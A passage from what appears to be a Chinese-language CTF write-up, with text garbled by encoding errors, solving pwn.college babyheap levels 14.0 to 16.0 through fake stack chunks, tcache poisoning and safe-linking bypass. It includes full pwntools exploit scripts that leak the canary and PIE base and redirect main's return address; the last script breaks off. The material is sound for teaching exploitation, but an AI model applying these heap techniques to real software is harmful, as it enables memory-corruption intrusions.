<p>å †å—è§†è§’:</p>
<table>
<thead>
<tr>
<th>prev_size</th>
<th>- 0x10</th>
<th>ä½</th>
</tr>
</thead>
<tbody><tr>
<td>size</td>
<td>- 0x8</td>
<td></td>
</tr>
<tr>
<td><strong>chunkmem</strong></td>
<td><strong>0</strong></td>
<td></td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
<td></td>
</tr>
<tr>
<td>canary</td>
<td>+ 0x48</td>
<td></td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
<td></td>
</tr>
<tr>
<td>main_retaddr</td>
<td>+ 0x58</td>
<td></td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
<td></td>
</tr>
<tr>
<td>__libc_start_main_retaddr</td>
<td>+ 0x128</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td>é«˜</td>
</tr>
</tbody></table>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usable_size = 0x130</span><br><span class="line">chunk_size = (0x130+0x10) | 1 = 0x141</span><br></pre></td></tr></table></figure>



<p>æ­¤æ—¶<code>chunkmem + 0x48</code>å¤„æ˜¯<code>main</code>æ ˆå¸§ä¸­çš„<code>canary</code>æ‰€åœ¨åœ°</p>
<p>æ­¤æ—¶<code>chunkmem + 0x58</code>å¤„æ˜¯<code>main</code>å‡½æ•°çš„è¿”å›åœ°å€, æ­£å¸¸æƒ…å†µä¸‹æ˜¯<code>__libc_start_main+243 @ glibc</code>å¤„</p>
<p>æ­¤æ—¶<code>chunkmem + 0x128</code>å¤„æ˜¯<code>__libc_start_main</code>å‡½æ•°è¿”å›åœ°å€, æ­£å¸¸æƒ…å†µä¸‹æ˜¯<code>_start+46 @ babylevel14.0</code>å¤„</p>
<p>æ­£å¥½ä¸¤ä¸ªåœ°å€ä¸€ä¸ªå¯ä»¥æ³„éœ²<code>libc_base</code>, ä¸€ä¸ªå¯ä»¥æ³„éœ²<code>pie_base</code>, å½“ç„¶, æœ¬é¢˜ä¸­åªéœ€è¦æ³„éœ²<code>pie_base</code></p>
<p>æ¥ä¸‹æ¥å°±å¯ä»¥åœ¨<code>chunkmem</code>ä¸Šæº¢å‡º</p>
<p>ç»¼ä¸Š</p>
<p>1.åœ¨å †æ ˆä¸Šæ„é€ å‡å †å—, å¤§å°æ¶µç›–ä¸¤ä¸ªè¿”å›åœ°å€</p>
<p>2.ä¸‹ä¸€æ¬¡<code>malloc</code>æ‹¿åˆ°å‡å †å—, æ‰“å°æ³„éœ²<code>canary</code>å’Œä¸¤ä¸ªè¿”å›åœ°å€, è®¡ç®—å¾—åˆ°<code>pie_base</code></p>
<p>3.åœ¨å‡å †å—ä¸Šæº¢å‡º</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># p = process(&quot;./babyheap_level14.0&quot;)</span></span><br><span class="line">p = process(<span class="string">&quot;/challenge/babyheap_level14.0&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">index,size</span>):</span><br><span class="line">  index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">  size = <span class="built_in">str</span>(size).encode()</span><br><span class="line">  p.sendline(<span class="string">b&#x27;malloc&#x27;</span>)</span><br><span class="line">  p.sendline(index)</span><br><span class="line">  p.sendline(size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">  index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">  p.sendline(<span class="string">b&#x27;free&#x27;</span>)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">echo</span>(<span class="params">index,offset,n = <span class="number">6</span></span>):</span><br><span class="line">  index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">  offset = <span class="built_in">str</span>(offset).encode()</span><br><span class="line">  p.sendline(<span class="string">b&#x27;echo&#x27;</span>)</span><br><span class="line">  p.sendline(index)</span><br><span class="line">  p.sendline(offset)</span><br><span class="line">  p.recvuntil(<span class="string">b&#x27;Data: &#x27;</span>)</span><br><span class="line">  data = p.recv(n)</span><br><span class="line">  data = data[::-<span class="number">1</span>]</span><br><span class="line">  data = <span class="built_in">int</span>.from_bytes(data,byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">  <span class="comment"># data = int(data,16)</span></span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scanf</span>(<span class="params">index,content</span>):</span><br><span class="line">  index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">  p.sendline(<span class="string">b&#x27;scanf&#x27;</span>)</span><br><span class="line">  p.sendline(index)</span><br><span class="line">  p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stack_free</span>():</span><br><span class="line">  p.sendline(<span class="string">b&#x27;stack_free&#x27;</span>)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stack_scanf</span>(<span class="params">content</span>):</span><br><span class="line">  p.sendline(<span class="string">b&#x27;stack_scanf&#x27;</span>)</span><br><span class="line">  p.sendline(content)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#1.å †æ ˆæº¢å‡ºæ„é€ å‡å †å—å¹¶é‡Šæ”¾ï¼Œä½¿ä¹‹è¿›å…¥tcache</span></span><br><span class="line"></span><br><span class="line">usable_size = <span class="number">0x130</span></span><br><span class="line">chunk_size = ( usable_size + <span class="number">0x10</span> ) | <span class="number">1</span>     <span class="comment">#1 means previous chunk is in use</span></span><br><span class="line"></span><br><span class="line">buffer = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(chunk_size)</span><br><span class="line">stack_scanf(buffer)</span><br><span class="line">stack_free()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.é€šè¿‡å‡å †å—æ³„éœ²è¿”å›åœ°å€ä¸Šçš„å€¼, æ³„éœ²canary</span></span><br><span class="line">canary_offset = <span class="number">0x48</span></span><br><span class="line">main_retaddr_offset = <span class="number">0x58</span></span><br><span class="line">__libc_start_main_retaddr_offset = <span class="number">0x128</span></span><br><span class="line">malloc(<span class="number">1</span>,usable_size)</span><br><span class="line">main_retaddr_value = echo(<span class="number">1</span>,main_retaddr_offset)</span><br><span class="line">__libc_start_main_retaddr_value = echo(<span class="number">1</span>,__libc_start_main_retaddr_offset)</span><br><span class="line">canary = echo(<span class="number">1</span>,canary_offset+<span class="number">1</span>,<span class="number">7</span>)</span><br><span class="line">canary = canary &lt;&lt; <span class="number">8</span></span><br><span class="line"></span><br><span class="line">start_offset = <span class="number">0x13AE</span></span><br><span class="line">win_offset = <span class="number">0x1A22</span></span><br><span class="line">pie_base = __libc_start_main_retaddr_value - start_offset</span><br><span class="line">win_addr= pie_base + win_offset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(main_retaddr_offset)</span></span><br><span class="line"><span class="comment"># print(__libc_start_main_retaddr_offset)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_retaddr_value))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(__libc_start_main_retaddr_value))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pie_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(win_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary = &quot;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment">#3.åœ¨å‡å †å—ä¸Šæº¢å‡º</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*canary_offset + p64(canary) </span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(main_retaddr_offset - <span class="built_in">len</span>(payload)) + p64(win_addr)</span><br><span class="line"></span><br><span class="line">scanf(<span class="number">1</span>,payload)</span><br><span class="line"><span class="built_in">print</span>(proc.pidof(p)[<span class="number">0</span>])</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(proc.pidof(p)[<span class="number">0</span>])</span><br><span class="line">pause()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>







<h3 id="level14-1"><a href="#level14-1" class="headerlink" title="level14.1"></a>level14.1</h3><p>bufferè§†è§’</p>
<table>
<thead>
<tr>
<th></th>
<th>åç§»</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>buffer</td>
<td>0</td>
<td></td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
<td></td>
</tr>
<tr>
<td>prev_size</td>
<td>+ 0x30</td>
<td></td>
</tr>
<tr>
<td>size</td>
<td>+ 0x38</td>
<td></td>
</tr>
<tr>
<td>chunk_mem</td>
<td>+ 0x40</td>
<td></td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
<td></td>
</tr>
<tr>
<td>canary</td>
<td>+ 0x88</td>
<td></td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
<td></td>
</tr>
<tr>
<td>main_ret</td>
<td>+ 0x98</td>
<td></td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
<td></td>
</tr>
<tr>
<td>libc_start_main_ret</td>
<td>+ 0x168</td>
<td></td>
</tr>
</tbody></table>
<p>å‡å †å—è§†è§’</p>
<table>
<thead>
<tr>
<th></th>
<th>åç§»</th>
</tr>
</thead>
<tbody><tr>
<td>chunk_mem</td>
<td>0</td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
</tr>
<tr>
<td>canary</td>
<td>+ 0x48</td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
</tr>
<tr>
<td>main_ret</td>
<td>+ 0x58</td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
</tr>
<tr>
<td>overflow_limit</td>
<td>+ 0x7f</td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
</tr>
<tr>
<td>libc_start_main_ret</td>
<td>+ 0x128</td>
</tr>
</tbody></table>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯winå‡½æ•°åœ°å€çš„æœ€ä½å­—èŠ‚æ˜¯0x9å†™ä¸è¿›å»?æ¢æˆ0x1Då°±å¯ä»¥äº†?</p>
<h3 id="level15-0"><a href="#level15-0" class="headerlink" title="level15.0"></a>level15.0</h3><p>åªæœ‰å †å—çš„å¢åˆ æ”¹æŸ¥ä¸šåŠ¡</p>
<p>è¿˜æ˜¯å€ŸåŠ©<code>echo</code>æ³„éœ²å †æ ˆåœ°å€, ç„¶ååœ¨å †æ ˆä¸Šæ„é€ å‡å †å—,æ¶µç›–è¿”å›åœ°å€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//echo</span></span><br><span class="line">  _WORD stack_var[<span class="number">7</span>]; <span class="comment">// [rsp+22h] [rbp-Eh] BYREF</span></span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="type">char</span> *)stack_var, <span class="string">&quot;Data:&quot;</span>);</span><br><span class="line">  argv = (<span class="type">size_t</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  *argv = (<span class="type">size_t</span>)<span class="string">&quot;/bin/echo&quot;</span>;</span><br><span class="line">  argv[<span class="number">1</span>] = (<span class="type">size_t</span>)stack_var;</span><br></pre></td></tr></table></figure>

<p>æ¯æ¬¡<code>echo</code>éƒ½ä¼šæœ‰å†…å­˜æ³„éœ², <code>argv</code>è¿™ä¸ªå †å—ä¸ä¼šè¢«é‡Šæ”¾</p>
<p><code>argv[1]</code>ä¿å­˜äº†<code>echo</code>çš„ä¸€ä¸ªå±€éƒ¨å˜é‡çš„åœ°å€, å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ³„éœ²å †æ ˆåœ°å€</p>
<blockquote>
<p>ç„¶è€Œç°åœ¨ä¸èƒ½ä½¿ç”¨<code>UAF</code>, å› ä¸ºåœ¨<code>main</code>ä¸­é‡Šæ”¾å †å—æ—¶ä¼šç«‹åˆ»å°†å †å—æŒ‡é’ˆæ¸…é›¶, é¿å…äº†<code>UAF</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(input, <span class="string">&quot;free&quot;</span>) )            <span class="comment">// free</span></span><br><span class="line">...</span><br><span class="line">      <span class="built_in">free</span>(chunks[index_1]);</span><br><span class="line">      chunks[index_1] = <span class="number">0LL</span>;                  <span class="comment">// æ²¡æœ‰UAF</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>ä½†æ˜¯<code>main</code>ä¸­<code>read</code>æœ‰å †æº¢å‡º</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">strcmp</span>(input, <span class="string">&quot;read&quot;</span>) )                <span class="comment">// read</span></span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%127s&quot;</span>, input);</span><br><span class="line"><span class="built_in">puts</span>(gaps);</span><br><span class="line">index_3 = atoi(input);</span><br><span class="line"><span class="keyword">if</span> ( index_3 &gt; <span class="number">0xF</span> )</span><br><span class="line">  __assert_fail(<span class="string">&quot;allocation_index &lt; 16&quot;</span>, <span class="string">&quot;&lt;stdin&gt;&quot;</span>, <span class="number">0x142</span>u, <span class="string">&quot;main&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%127s&quot;</span>, input);</span><br><span class="line"><span class="built_in">puts</span>(gaps);</span><br><span class="line">sizea = atoi(input);	<span class="comment">//è¶Šç•Œå†™å¤šå°‘å®Œå…¨è‡ªå·±å†³å®š</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] read(0, allocations[%d], %d)\n&quot;</span>, index_3, sizea);</span><br><span class="line">read(<span class="number">0</span>, chunks[index_3], sizea);</span><br><span class="line"><span class="built_in">puts</span>(gaps);</span><br></pre></td></tr></table></figure>

<p>ç»¼ä¸Š,æ•´ä¸ªåˆ©ç”¨è¿‡ç¨‹:</p>
<p>0x1.é¦–å…ˆ<code>chunk1 = malloc(0x20)</code>,æ‹¿åˆ°ä¸€ä¸ªå †å—,é‚£ä¹ˆç¬¬ä¸€æ¬¡<code>echo</code>æ—¶ç”³è¯·çš„å †å—A,å°±ç´§è·Ÿåœ¨<code>chunk1</code>åé¢é«˜å¤„,è¿™æ˜¯æº¢å‡ºçš„å¿…è¦æ¡ä»¶</p>
<p>0x2.ç¬¬äºŒæ¬¡<code>echo</code>,ä»¥<code>chunk1</code>ä¸ºåŸºåœ°å€,æ³„éœ²å †å—<code>A+0x8</code>åç§»å¤„çš„å †æ ˆåœ°å€,å¹¶æ ¹æ®ç›¸å¯¹è·ç¦»è®¡ç®—å¾—åˆ°<code>main</code>å‡½æ•°å’Œ<code>libc_start_main</code>å‡½æ•°çš„è¿”å›åœ°å€</p>
<p>0x3.åˆ©ç”¨å †æº¢å‡ºé€ æˆä»»æ„åœ°å€è¯»,æ ¹æ®<code>libc_start_main</code>è¿”å›åˆ°<code>start</code>ä¸­çš„åœ°å€,è®¡ç®—å¾—åˆ°<code>pie</code>åŸºå€,æ ¹æ®<code>win</code>çš„åç§»é‡è®¡ç®—å¾—åˆ°<code>win</code>çš„åœ°å€</p>
<p>0x4.åˆ©ç”¨å †æº¢å‡ºé€ æˆçš„ä»»æ„åœ°å€å†™,ä¿®æ”¹<code>main</code>å‡½æ•°çš„è¿”å›åœ°å€ä¸º<code>win</code></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&quot;./babyheap_level15.0&quot;)</span></span><br><span class="line">p = process(<span class="string">&quot;/challenge/babyheap_level15.0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">index,size</span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    size = <span class="built_in">str</span>(size).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;malloc&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(size)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;free&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">echo</span>(<span class="params">index,offset,size=<span class="number">0</span></span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    offset = <span class="built_in">str</span>(offset).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;echo&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(offset)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(size == <span class="number">0</span>):</span><br><span class="line">        data = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = p.recv(size)</span><br><span class="line">    data = <span class="built_in">int</span>.from_bytes(data,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    size = <span class="built_in">str</span>(size).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;read&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(size)    </span><br><span class="line">    p.sendline(content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):				</span><br><span class="line">  malloc(<span class="number">2</span>,<span class="number">0x10</span>)</span><br><span class="line">  malloc(<span class="number">3</span>,<span class="number">0x10</span>)</span><br><span class="line">  malloc(<span class="number">4</span>,<span class="number">0x10</span>)</span><br><span class="line">  free(<span class="number">4</span>)</span><br><span class="line">  free(<span class="number">3</span>)</span><br><span class="line">  payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+ p64(<span class="number">0x31</span>)+p64(addr)</span><br><span class="line">  read(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">  malloc(<span class="number">5</span>,<span class="number">0x10</span>)</span><br><span class="line">  malloc(<span class="number">6</span>,<span class="number">0x10</span>)</span><br><span class="line">  data = echo(<span class="number">6</span>,<span class="number">0</span>,<span class="number">6</span>)</span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modify</span>(<span class="params">addr,content</span>):</span><br><span class="line">  malloc(<span class="number">2</span>,<span class="number">0x10</span>)</span><br><span class="line">  malloc(<span class="number">3</span>,<span class="number">0x10</span>)</span><br><span class="line">  malloc(<span class="number">4</span>,<span class="number">0x10</span>)</span><br><span class="line">  free(<span class="number">4</span>)</span><br><span class="line">  free(<span class="number">3</span>)</span><br><span class="line">  payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+ p64(<span class="number">0x31</span>)+p64(addr)</span><br><span class="line">  read(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">  malloc(<span class="number">5</span>,<span class="number">0x10</span>)</span><br><span class="line">  malloc(<span class="number">6</span>,<span class="number">0x10</span>)</span><br><span class="line">  read(<span class="number">6</span>,<span class="number">6</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0x20</span>)</span><br><span class="line">echo(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">data = echo(<span class="number">0</span>,<span class="number">0x38</span>,<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(data))</span><br><span class="line">stack_leak_addr = data</span><br><span class="line"></span><br><span class="line">main_ret = stack_leak_addr + <span class="number">0x176</span></span><br><span class="line">libc_start_main_ret = stack_leak_addr + <span class="number">0x246</span></span><br><span class="line"></span><br><span class="line">data = leak(libc_start_main_ret)    <span class="comment">#arbitrary read</span></span><br><span class="line">pie_base = data - <span class="number">0x142E</span></span><br><span class="line">win_addr = pie_base + <span class="number">0x1B00</span></span><br><span class="line"></span><br><span class="line">modify(main_ret,p64(win_addr))      <span class="comment">#arbitrary write</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="level16-0"><a href="#level16-0" class="headerlink" title="level16.0"></a>level16.0</h3><p>level16.0ä¸­ä½¿ç”¨libc-2.35,æ­¤æ—¶nextæŒ‡é’ˆå·²ç»è¢«ä¿æŠ¤èµ·æ¥</p>
<p>åˆ©ç”¨ <code>tcacheæ•°æ®ç»“æ„ä¸ç®—æ³•/glibc-2.38/exploit/[safe-linking]*</code>çš„æ€è·¯</p>
<p><strong>å‡è®¾fake_chunk_memå·²ç»å¯¹é½åˆ°0x10</strong></p>
<p>0x0.chunk0 &#x3D; malloc(0x10)</p>
<p>0x1.chunk1 &#x3D; malloc(0x10)</p>
<p>0x2.chunk2 &#x3D; malloc(0x10)</p>
<p>0x3.free(chunk1)</p>
<p>0x4.free(chunk2)</p>
<p>0x5.[UAF] chunk2.next &#x3D;  ( é¡µæ¡†å· ) ^ (fake_chunk_mem)</p>
<p>0x6.chunk2 &#x3D; malloc()</p>
<p>0x7.fake_chunk &#x3D; malloc()</p>
<blockquote>
<p>æ­¤æ—¶fake_chunk.keyå½’é›¶</p>
<p>tcache-&gt;entries[idx] &#x3D; REVEAL_PTR(fake_chunk.next)</p>
</blockquote>
<p>0x8.free(chunk0)</p>
<blockquote>
<p>æ­¤æ—¶chunk0.next &#x3D; PROTECT_PTR(REVEAL_PTR(fake_chunk.next))</p>
</blockquote>
<p>0x9.[UAF] puts(chunk0.next)</p>
<p>0xA.è®¡ç®—fake_chunk.next</p>
<blockquote>
<p>fake_chunk.next &#x3D; chunk0.next ^ (é¡µæ¡†å·) ^ (fake_chunk_addr &gt;&gt; 12)</p>
</blockquote>
<p>å†™ä¸ªexpæ„æ€æ„æ€</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./babyheap_level16.0&#x27;)</span></span><br><span class="line">p 